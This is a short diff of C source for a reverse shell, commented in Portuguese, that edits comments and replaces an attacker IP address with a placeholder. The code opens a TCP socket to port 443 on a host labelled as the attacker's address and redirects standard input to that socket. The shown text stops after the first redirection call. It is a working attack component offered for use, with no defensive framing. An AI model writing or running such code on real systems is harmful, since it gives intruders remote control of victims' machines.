@@ -9,12 +9,12 @@
 
 int main(void){
     int port = 443;
-    struct sockaddr_in revshell; //nome de nossa struct
+    struct sockaddr_in revshell; //nome de nossa estrutura
 
     int sock = socket(AF_INET, SOCK_STREAM, 0); //definindo o socket informando o tipo de conexão TCP
     revshell.sin_family = AF_INET; // definindo a familia do socket
-    revshell.sin_port = htons(port); //recebe um valor em 16 bits, e devolve em 16 bits (s = short) (l = long)
-    revshell.sin_addr.s_addr = inet_addr("192.168.101.12"); // endereço do atacante
+    revshell.sin_port = htons(port); //recebe um valor em 16 bits, e devolve em 16 bits
+    revshell.sin_addr.s_addr = inet_addr("0.0.0.0"); // (seu endereço de ip) 
 
     connect(sock, (struct sockaddr *) &revshell, sizeof(revshell));
     dup2(sock, 0);
